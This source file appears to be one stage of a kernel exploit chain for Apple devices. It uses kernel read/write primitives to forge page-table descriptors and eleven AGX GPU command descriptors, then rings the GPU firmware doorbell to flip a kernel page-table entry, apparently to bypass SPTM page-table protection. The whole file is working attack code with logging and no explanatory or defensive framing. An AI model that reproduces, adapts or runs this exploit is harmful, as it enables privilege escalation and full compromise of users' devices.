#include <mach/mach.h>
#include <mach/mach_time.h>
#include <mach/vm_map.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/mman.h>
#include <limits.h>
#import  <Foundation/Foundation.h>
#include <IOKit/IOKitLib.h>
#import  <Metal/Metal.h>
#include "kernel_primitives.h"
#include "kread_bootstrap.h"
#include "sptm_bypass.h"
#include "agx_internal.h"

static int agx_forge_kobj_scaffold(void);
static int agx_forge_kwrite_scaffold(void);
static int agx_forge_descriptors(void);
static int agx_forge_submit(void);

#pragma mark - forge: kobj scaffold (kwrite-zone)

static int agx_forge_kobj_scaffold(void) {
    kwlog("[forge] === kobj scaffold (kwrite zone) ===\n");

    const uint32_t alloc_size = 0x4000;
    const uint64_t page_mask  = (uint64_t)vm_page_size - 1ULL;
    uint32_t got_size = 0;
    mach_port_t port = 0;
    int rc;

    kwlog("[forge] allocating kobj1 (size=0x%x)...\n", alloc_size);
    uint64_t kobj1 = kern_port_kobj_find_impl(alloc_size, &got_size, &port);
    if (!kobj1) {
        kwlog("[forge] FAIL: kern_port_kobj_find kobj1\n");
        return -1;
    }
    uint64_t k1_pte_val = 0, k1_pa = 0;
    rc = kernel_pte_walk_full(kobj1 & ~page_mask, NULL, &k1_pte_val, &k1_pa);
    if (rc || !(k1_pte_val & 0xFFFFFFFFC000ULL)) {
        kwlog("[forge] FAIL: pte_walk kobj1 rc=%d pte_val=0x%llx\n",
                rc, (unsigned long long)k1_pte_val);
        return -2;
    }
    g_agx_fw.kobj1_kva = kobj1;
    g_agx_fw.kobj1_pa  = k1_pte_val & 0xFFFFFFFFC000ULL;
    kwlog("[forge] kobj1 kva=0x%llx pa=0x%llx\n",
            (unsigned long long)g_agx_fw.kobj1_kva,
            (unsigned long long)g_agx_fw.kobj1_pa);

    kwlog("[forge] allocating kobj2 (size=0x%x)...\n", alloc_size);
    uint64_t kobj2 = kern_port_kobj_find_impl(alloc_size, &got_size, &port);
    if (!kobj2) {
        kwlog("[forge] FAIL: kern_port_kobj_find kobj2\n");
        return -3;
    }
    uint64_t k2_pte_val = 0;
    rc = kernel_pte_walk_full(kobj2 & ~page_mask, NULL, &k2_pte_val, NULL);
    if (rc || !(k2_pte_val & 0xFFFFFFFFC000ULL)) {
        kwlog("[forge] FAIL: pte_walk kobj2 rc=%d pte_val=0x%llx\n",
                rc, (unsigned long long)k2_pte_val);
        return -4;
    }
    g_agx_fw.kobj2_kva = kobj2;
    g_agx_fw.kobj2_pa  = k2_pte_val & 0xFFFFFFFFC000ULL;
    kwlog("[forge] kobj2 kva=0x%llx pa=0x%llx\n",
            (unsigned long long)g_agx_fw.kobj2_kva,
            (unsigned long long)g_agx_fw.kobj2_pa);

    kwlog("[forge] allocating kobj3 (size=0x%x)...\n", alloc_size);
    uint64_t kobj3 = kern_port_kobj_find_impl(alloc_size, &got_size, &port);
    if (!kobj3) {
        kwlog("[forge] FAIL: kern_port_kobj_find kobj3\n");
        return -5;
    }
    g_agx_fw.kobj3_kva = kobj3;

    uint64_t k3_leaf_pte_kva = 0;
    rc = kernel_pte_walk_full(kobj3, &k3_leaf_pte_kva, NULL, NULL);
    if (rc || !k3_leaf_pte_kva) {
        kwlog("[forge] FAIL: pte_walk kobj3 rc=%d\n", rc);
        return -6;
    }
    g_agx_fw.kobj3_leaf_pte_kva = k3_leaf_pte_kva;

    uint64_t k3_leaf_pte_val = 0;
    if (kread_qword(k3_leaf_pte_kva, &k3_leaf_pte_val)) {
        kwlog("[forge] FAIL: kread leaf PTE @ 0x%llx\n",
                (unsigned long long)k3_leaf_pte_kva);
        return -7;
    }
    g_agx_fw.kobj3_leaf_pte_val = k3_leaf_pte_val;

    uint64_t k3_meta_pte_val = 0;
    rc = kernel_pte_walk_full(k3_leaf_pte_kva & ~page_mask, NULL, &k3_meta_pte_val, NULL);
    if (rc || !(k3_meta_pte_val & 0xFFFFFFFFC000ULL)) {
        kwlog("[forge] FAIL: pte_walk meta(kobj3) rc=%d meta_pte=0x%llx\n",
                rc, (unsigned long long)k3_meta_pte_val);
        return -8;
    }
    g_agx_fw.kobj3_meta_pte_val = k3_meta_pte_val;
    kwlog("[forge] kobj3 kva=0x%llx leaf_pte_kva=0x%llx leaf_pte_val=0x%llx meta_pte=0x%llx\n",
            (unsigned long long)g_agx_fw.kobj3_kva,
            (unsigned long long)g_agx_fw.kobj3_leaf_pte_kva,
            (unsigned long long)g_agx_fw.kobj3_leaf_pte_val,
            (unsigned long long)g_agx_fw.kobj3_meta_pte_val);

    kwlog("[forge] allocating kobj4 (size=0x%x)...\n", alloc_size);
    uint64_t kobj4 = kern_port_kobj_find_impl(alloc_size, &got_size, &port);
    if (!kobj4) {
        kwlog("[forge] FAIL: kern_port_kobj_find kobj4\n");
        return -9;
    }
    g_agx_fw.kobj4_kva = kobj4;

    uint64_t k4_leaf_pte_kva = 0;
    rc = kernel_pte_walk_full(kobj4, &k4_leaf_pte_kva, NULL, NULL);
    if (rc || !k4_leaf_pte_kva) {
        kwlog("[forge] FAIL: pte_walk kobj4 rc=%d\n", rc);
        return -10;
    }
    g_agx_fw.kobj4_leaf_pte_kva = k4_leaf_pte_kva;

    uint64_t k4_meta_pte_val = 0;
    rc = kernel_pte_walk_full(k4_leaf_pte_kva & ~page_mask, NULL, &k4_meta_pte_val, NULL);
    if (rc) {
        kwlog("[forge] FAIL: pte_walk meta(kobj4) rc=%d\n", rc);
        return -11;
    }
    uint64_t k4_meta_pa = k4_meta_pte_val & 0xFFFFFFFFC000ULL;
    if (!k4_meta_pa) {
        kwlog("[forge] FAIL: meta(kobj4) PA == 0 (pte=0x%llx)\n",
                (unsigned long long)k4_meta_pte_val);
        return -12;
    }
    g_agx_fw.kobj4_meta_pte_pa = k4_meta_pa;
    kwlog("[forge] kobj4 kva=0x%llx leaf_pte_kva=0x%llx meta_pte_pa=0x%llx\n",
            (unsigned long long)g_agx_fw.kobj4_kva,
            (unsigned long long)g_agx_fw.kobj4_leaf_pte_kva,
            (unsigned long long)g_agx_fw.kobj4_meta_pte_pa);

    kwlog("[forge] === OK ===\n");
    return 0;
}

#pragma mark - forge: kwrite scaffold (forged page-table descriptors)

static int agx_forge_kwrite_scaffold(void) {
    kwlog("[forge] === kwrite scaffold setup ===\n");

    if (!g_agx_fw.kobj1_kva || !g_agx_fw.kobj2_kva || !g_agx_fw.kobj3_kva ||
        !g_agx_fw.kobj4_kva || !g_agx_fw.ptr_v48_7_pa) {
        kwlog("[forge] FAIL: prerequisites missing\n");
        return -1;
    }

    uint8_t fw_l0_buf[64];
    if (kread_via_thread_state_impl(g_agx_fw.ptr_v48_7_pa, fw_l0_buf, 64) != KERN_SUCCESS) {
        kwlog("[forge] FAIL: kread 64B from L0 @ 0x%llx\n",
                (unsigned long long)g_agx_fw.ptr_v48_7_pa);
        return -2;
    }
    kwlog("[forge] kread 64B from firmware L0: first qword=0x%llx\n",
            (unsigned long long)*(uint64_t *)fw_l0_buf);

    kern_return_t kr = kwrite_buf(g_agx_fw.kobj1_kva, fw_l0_buf, 64);
    if (kr) {
        kwlog("[forge] FAIL: kwrite_buf kobj1 = 0x%x\n", kr);
        return -3;
    }
    kwlog("[forge] kwrite kobj1 (64B forged L0) OK @ 0x%llx\n",
            (unsigned long long)g_agx_fw.kobj1_kva);

    uint64_t l0_entry7 = g_agx_fw.kobj2_pa | 3ULL;
    kr = kwrite_buf(g_agx_fw.kobj1_kva + 56, &l0_entry7, 8);
    if (kr) {
        kwlog("[forge] FAIL: kwrite_buf kobj1+56 = 0x%x\n", kr);
        return -4;
    }
    kwlog("[forge] kwrite kobj1+56 = 0x%llx (kobj2_pa|3) OK\n",
            (unsigned long long)l0_entry7);

    uint64_t k2_pte = (g_agx_fw.kobj3_meta_pte_val & 0xFFFFFFE000000ULL) |
                      0x20000000000445ULL;
    kr = kwrite_buf(g_agx_fw.kobj2_kva, &k2_pte, 8);
    if (kr) {
        kwlog("[forge] FAIL: kwrite_buf kobj2 = 0x%x\n", kr);
        return -5;
    }
    kwlog("[forge] kwrite kobj2 = 0x%llx (forged L1 block desc) OK\n",
            (unsigned long long)k2_pte);

    const uint64_t v274          = 0xFFFFFFF000000000ULL;
    const uint64_t page_mask     = (uint64_t)vm_page_size - 1ULL;

    g_agx_fw.s11_kobj1_pa        = g_agx_fw.kobj1_pa;
    g_agx_fw.s11_kobj1_kva       = g_agx_fw.kobj1_kva;
    g_agx_fw.s11_kobj2_kva       = g_agx_fw.kobj2_kva;
    g_agx_fw.s11_v274_const      = v274;
    g_agx_fw.s11_k3_leaf_pte_kva = g_agx_fw.kobj3_leaf_pte_kva;
    g_agx_fw.s11_k3_aliased_kva  =
        (v274 | (g_agx_fw.kobj3_meta_pte_val & 0x1FFC000ULL)) +
        (page_mask & g_agx_fw.kobj3_leaf_pte_kva);
    g_agx_fw.s11_k3_pte_spliced  =
        (g_agx_fw.kobj3_leaf_pte_val & 0xFFFF000000003FFFULL) |
        g_agx_fw.kobj4_meta_pte_pa;
    g_agx_fw.s11_k4_pte_offset_in_k3 =
        ((g_agx_fw.kobj4_kva >> 11) & 0x3FF8ULL) + g_agx_fw.kobj3_kva;
    g_agx_fw.s11_k4_kva_copy     = g_agx_fw.kobj4_kva;

    kwlog("[forge] state:\n");
    kwlog("        v177[95]  kobj1_pa             = 0x%llx\n", (unsigned long long)g_agx_fw.s11_kobj1_pa);
    kwlog("        v177[96]  kobj1_kva            = 0x%llx\n", (unsigned long long)g_agx_fw.s11_kobj1_kva);
    kwlog("        v177[97]  kobj2_kva            = 0x%llx\n", (unsigned long long)g_agx_fw.s11_kobj2_kva);
    kwlog("        v177[98]  v274_const           = 0x%llx\n", (unsigned long long)g_agx_fw.s11_v274_const);
    kwlog("        v177[99]  k3_leaf_pte_kva      = 0x%llx\n", (unsigned long long)g_agx_fw.s11_k3_leaf_pte_kva);
    kwlog("        v177[100] k3_aliased_kva       = 0x%llx\n", (unsigned long long)g_agx_fw.s11_k3_aliased_kva);
    kwlog("        v177[101] k3_pte_spliced       = 0x%llx\n", (unsigned long long)g_agx_fw.s11_k3_pte_spliced);
    kwlog("        v177[162] k4_pte_offset_in_k3  = 0x%llx\n", (unsigned long long)g_agx_fw.s11_k4_pte_offset_in_k3);
    kwlog("        v177[163] k4_kva_copy          = 0x%llx\n", (unsigned long long)g_agx_fw.s11_k4_kva_copy);

    kwlog("[forge] === OK ===\n");
    return 0;
}

#pragma mark - forge: build the 11 GPU descriptors

static int agx_forge_descriptors(void) {
    kwlog("[forge] === build 11 GPU descriptors ===\n");

    if (!g_agx_fw.zero_wp_mapped_va || !g_agx_fw.zero_wp_kva ||
        !g_agx_fw.v43 || !g_agx_fw.v44_kva || !g_agx_fw.v45_kva || !g_agx_fw.v46_kva ||
        !g_agx_fw.v47_base || !g_agx_fw.v49_const || !g_agx_fw.v50_const ||
        !g_agx_fw.v51_kva || !g_agx_fw.v52_val || !g_agx_fw.v53_kva ||
        !g_agx_fw.v54_kva ||
        !g_agx_fw.s11_k3_aliased_kva || !g_agx_fw.s11_k3_pte_spliced ||
        !g_agx_fw.kobj1_pa) {
        kwlog("[forge] FAIL: prerequisites missing\n");
        return -1;
    }

    uint64_t v240 = 0;
    int kr = kread_ptr_by_firmware_vaddr(g_agx_fw.v43, &v240);
    if (kr) {
        kwlog("[forge] FAIL: kread_ptr_by_firmware_vaddr(v43=0x%llx) = %d\n",
                (unsigned long long)g_agx_fw.v43, kr);
        return -2;
    }
    uint64_t lobyte_off = v240 & 0xFFULL;
    kwlog("[forge] *v43 = 0x%llx, LOBYTE = 0x%llx\n",
            (unsigned long long)v240, (unsigned long long)lobyte_off);

    g_agx_fw.s12_v240_kread_ptr  = v240;
    g_agx_fw.s12_lobyte_off      = lobyte_off;
    g_agx_fw.s12_desc_base_user_va = g_agx_fw.zero_wp_mapped_va + lobyte_off;
    g_agx_fw.s12_desc_base_kva     = g_agx_fw.zero_wp_kva       + lobyte_off;

    uint8_t  *v228 = (uint8_t *)(uintptr_t)g_agx_fw.s12_desc_base_user_va;
    uint8_t  *v229 = v228 + 3072;
    uint64_t  v243 = g_agx_fw.s12_desc_base_kva + 3072;
    const uint64_t stride = 848;

    const uint64_t XMMWORD_431D0_LO = 0x00000000000003C4ULL;
    const uint64_t XMMWORD_431D0_HI = 0x0000000000300000ULL;
    const uint64_t XMMWORD_431E0_LO = 0x00000000000003C5ULL;
    const uint64_t XMMWORD_431E0_HI = 0x0000000000300000ULL;
    const uint64_t XMMWORD_431F0_LO = 0xFFFFFFFF80000000ULL;
    const uint64_t XMMWORD_431F0_HI = 0x0000000000000000ULL;

    #define DESC(idx) ((uint64_t *)(v229 + (idx) * stride))

    for (int i = 0; i < 11; i++) {
        memset(v229 + i * stride, 0, stride);
    }

    #define TAIL_D0()  do {                                                \
        uint64_t *_t = DESC(i);                                            \
        ((uint64_t *)((uint8_t *)_t + 264))[0] = XMMWORD_431D0_LO;         \
        ((uint64_t *)((uint8_t *)_t + 264))[1] = XMMWORD_431D0_HI;         \
        _t[280/8] = 16ULL;                                                 \
    } while (0)

    int i;

    i = 0;
    DESC(i)[0]      = g_agx_fw.v47_base;
    DESC(i)[1]      = 0;
    DESC(i)[2]      = 0;
    DESC(i)[240/8]  = g_agx_fw.v46_kva;
    DESC(i)[248/8]  = v243 + 1 * stride;
    DESC(i)[256/8]  = g_agx_fw.v45_kva + 4;
    TAIL_D0();

    i = 1;
    DESC(i)[0]      = g_agx_fw.v43;
    DESC(i)[1]      = v240;
    DESC(i)[2]      = 0;
    DESC(i)[240/8]  = g_agx_fw.v46_kva;
    DESC(i)[256/8]  = g_agx_fw.v45_kva;
    TAIL_D0();

    i = 2;
    DESC(i)[240/8]  = g_agx_fw.v46_kva;
    DESC(i)[256/8]  = g_agx_fw.v51_kva;
    TAIL_D0();

    i = 3;
    DESC(i)[0]      = g_agx_fw.v52_val + 264;
    DESC(i)[1]      = g_agx_fw.kobj1_pa;
    DESC(i)[2]      = 0;
    DESC(i)[240/8]  = g_agx_fw.v46_kva;
    DESC(i)[256/8]  = g_agx_fw.v45_kva;
    TAIL_D0();

    i = 4;
    DESC(i)[0]      = g_agx_fw.v52_val + 216;
    DESC(i)[1]      = v240;
    DESC(i)[2]      = 0;
    DESC(i)[240/8]  = g_agx_fw.v46_kva;
    DESC(i)[256/8]  = g_agx_fw.v45_kva;
    TAIL_D0();

    i = 5;
    DESC(i)[0]      = g_agx_fw.v52_val + 200;
    DESC(i)[1]      = v243 + 9 * stride;
    DESC(i)[2]      = 0;
    DESC(i)[240/8]  = g_agx_fw.v46_kva;
    DESC(i)[256/8]  = g_agx_fw.v45_kva;
    TAIL_D0();

    i = 6;
    DESC(i)[0]      = g_agx_fw.v49_const + 8;
    DESC(i)[1]      = 0;
    DESC(i)[2]      = 0;
    DESC(i)[240/8]  = g_agx_fw.v46_kva;
    DESC(i)[256/8]  = g_agx_fw.v45_kva;
    TAIL_D0();

    i = 7;
    DESC(i)[240/8]  = g_agx_fw.v46_kva;
    DESC(i)[256/8]  = g_agx_fw.v53_kva;
    TAIL_D0();

    i = 8;
    {
        uint64_t *d = DESC(i);
        d[0]                                       = g_agx_fw.v50_const;
        ((uint64_t *)((uint8_t *)d + 8))[0]        = XMMWORD_431F0_LO;
        ((uint64_t *)((uint8_t *)d + 8))[1]        = XMMWORD_431F0_HI;
        d[240/8]                                   = g_agx_fw.v54_kva;
        d[256/8]                                   = g_agx_fw.v45_kva;
    }
    TAIL_D0();

    i = 9;
    DESC(i)[0]      = g_agx_fw.s11_k3_aliased_kva;
    DESC(i)[1]      = g_agx_fw.s11_k3_pte_spliced;
    DESC(i)[2]      = 0;
    DESC(i)[240/8]  = g_agx_fw.v46_kva;
    DESC(i)[256/8]  = g_agx_fw.v45_kva;
    TAIL_D0();

    i = 10;
    {
        uint64_t *d = DESC(i);
        d[0]      = 0;
        d[256/8]  = g_agx_fw.v44_kva;
        ((uint64_t *)((uint8_t *)d + 264))[0] = XMMWORD_431E0_LO;
        ((uint64_t *)((uint8_t *)d + 264))[1] = XMMWORD_431E0_HI;
        d[280/8]  = 16ULL;
    }

    #undef TAIL_D0
    #undef DESC

    kwlog("[forge] descriptors built @ user_va=0x%llx (kva=0x%llx) lobyte=0x%llx\n",
            (unsigned long long)g_agx_fw.s12_desc_base_user_va,
            (unsigned long long)g_agx_fw.s12_desc_base_kva,
            (unsigned long long)g_agx_fw.s12_lobyte_off);
    kwlog("[forge] D0..D10 base kernel VAs: 0x%llx..0x%llx (stride=848)\n",
            (unsigned long long)v243,
            (unsigned long long)(v243 + 10 * stride));
    kwlog("[forge] === OK ===\n");
    return 0;
}

#pragma mark - forge: doorbell submit + fence wait (narrow kobj3 PTE flip)

static int agx_forge_submit(void) {
    kwlog("[forge] === doorbell submit + fence wait (narrow kobj3 PTE flip) ===\n");

    if (!g_agx_fw.zero_wp_mapped_va || !g_agx_fw.zero_wp_kva ||
        !g_agx_fw.base_wp_mapped_va || !g_agx_fw.s12_desc_base_user_va ||
        !g_agx_fw.s12_desc_base_kva || !g_agx_fw.v43 ||
        !g_agx_fw.s11_k3_leaf_pte_kva || !g_agx_fw.s11_k3_pte_spliced) {
        kwlog("[forge] FAIL: prerequisites missing\n");
        return -1;
    }

    const uint64_t a2_arg = g_agx_fw.v43 + 1ULL;
    const uint32_t a3_arg = (uint32_t)((g_agx_fw.s12_desc_base_kva + 3072) >> 8);

    {
        uint8_t *d0 = (uint8_t *)(uintptr_t)(g_agx_fw.s12_desc_base_user_va + 3072);
        *(uint64_t *)(d0 + 256) = g_agx_fw.v45_kva;
        kwlog("[forge] D0[+256] overwrite -> v45_kva = 0x%llx\n",
                (unsigned long long)g_agx_fw.v45_kva);
    }

    {
        uint8_t  *zw = (uint8_t *)(uintptr_t)g_agx_fw.zero_wp_mapped_va;
        uint64_t  zk = g_agx_fw.zero_wp_kva;
        *(uint64_t *)(zw + 0)     = zk + 512;
        *(uint32_t *)(zw + 12)    = 10;
        *(uint32_t *)(zw + 32)    = 1;
        *(uint32_t *)(zw + 40)    = 1;
        *(uint64_t *)(zw + 44)    = zk + 768;
        *(uint32_t *)(zw + 76)    = 0;
        *(uint32_t *)(zw + 112)   = 0;
        *(uint32_t *)(zw + 512)   = 9;
        *(uint64_t *)(zw + 768)   = a2_arg;
        *(uint32_t *)(zw + 784)   = a3_arg;
        *(uint64_t *)(zw + 1024)  = zk;
        *(uint64_t *)(zw + 1176)  = zk;
        *(uint64_t *)(zw + 1184)  = zk;
        kwlog("[forge] command header staged at zero_wp (a2=0x%llx a3=0x%x)\n",
                (unsigned long long)a2_arg, a3_arg);
    }

    {
        volatile uint64_t *bell = (volatile uint64_t *)(uintptr_t)g_agx_fw.base_wp_mapped_va;
        uint64_t zk = g_agx_fw.zero_wp_kva;
        kwlog("[forge] polling doorbell @ base_wp (current = 0x%llx)\n",
                (unsigned long long)*bell);
        int bell_iters = 0;
        while (*bell != 0 && bell_iters < 1000) {
            usleep(100);
            bell_iters++;
        }
        if (*bell != 0) {
            kwlog("[forge] FAIL: doorbell didn't clear (0x%llx after %d iters)\n",
                    (unsigned long long)*bell, bell_iters);
            return -2;
        }
        __asm__ __volatile__("dsb sy" ::: "memory");
        *bell = zk + 1024ULL;
        __asm__ __volatile__("dsb sy" ::: "memory");
        kwlog("[forge] doorbell rung: base_wp[0] = 0x%llx (+ DSB SY)\n",
                (unsigned long long)(zk + 1024ULL));
    }

    kwlog("[forge] fence wait: poll kva 0x%llx for value 0x%llx ...\n",
            (unsigned long long)g_agx_fw.s11_k3_leaf_pte_kva,
            (unsigned long long)g_agx_fw.s11_k3_pte_spliced);

    const int wait_per_attempt = 5000;
    const int max_attempts     = 3;
    for (int attempt = 0; attempt < max_attempts; attempt++) {
        for (int i = 0; i < wait_per_attempt; i++) {
            uint64_t current = 0;
            if (kread_qword(g_agx_fw.s11_k3_leaf_pte_kva, &current) != 0) {
                kwlog("[forge] FAIL: kread fence @ 0x%llx (attempt %d iter %d)\n",
                        (unsigned long long)g_agx_fw.s11_k3_leaf_pte_kva, attempt, i);
                return -3;
            }
            if (current == g_agx_fw.s11_k3_pte_spliced) {
                kwlog("[forge] FENCE HIT (attempt %d, %d iters): PTE = 0x%llx\n",
                        attempt, i, (unsigned long long)current);
                kwlog("[forge] === kobj3 fence-PTE flipped ===\n");
                return 0;
            }
            if ((i % 1000) == 0) {
                kwlog("[forge]   attempt %d iter %d: current=0x%llx target=0x%llx\n",
                        attempt, i, (unsigned long long)current,
                        (unsigned long long)g_agx_fw.s11_k3_pte_spliced);
            }
            usleep(1000);
        }
        if (attempt + 1 >= max_attempts) break;
        {
            volatile uint64_t *bell = (volatile uint64_t *)(uintptr_t)g_agx_fw.base_wp_mapped_va;
            uint64_t zk = g_agx_fw.zero_wp_kva;
            __asm__ __volatile__("dsb sy" ::: "memory");
            int wait = 0;
            while (*bell != 0 && wait < 100) { usleep(1000); wait++; }
            *bell = zk + 1024ULL;
            __asm__ __volatile__("dsb sy" ::: "memory");
            kwlog("[forge] attempt %d timed out -> re-ringing doorbell\n", attempt);
        }
    }
    kwlog("[forge] FAIL: fence timeout across %d attempts\n", max_attempts);
    return -4;
}

#pragma mark - Narrow doorbell fallback: entry point

int agx_doorbell_fallback_run(void) {
    kwlog("[fallback] -> running resolve...\n");
    int e410 = agx_forge_kobj_scaffold();
    if (e410 != 0) { kwlog("[fallback] forge kobj-scaffold failed: %d\n", e410); return -4; }

    kwlog("[fallback] -> running resolve...\n");
    int e411 = agx_forge_kwrite_scaffold();
    if (e411 != 0) { kwlog("[fallback] forge kwrite-scaffold failed: %d\n", e411); return -4; }

    kwlog("[fallback] -> running resolve...\n");
    int e412 = agx_forge_descriptors();
    if (e412 != 0) { kwlog("[fallback] forge descriptors failed: %d\n", e412); return -4; }

    kwlog("[fallback] -> running resolve (doorbell submit + fence wait)...\n");
    int e413 = agx_forge_submit();
    kwlog("[fallback] forge submit (doorbell) rc=%d\n", e413);
    return (e413 == 0) ? 0 : -4;
}
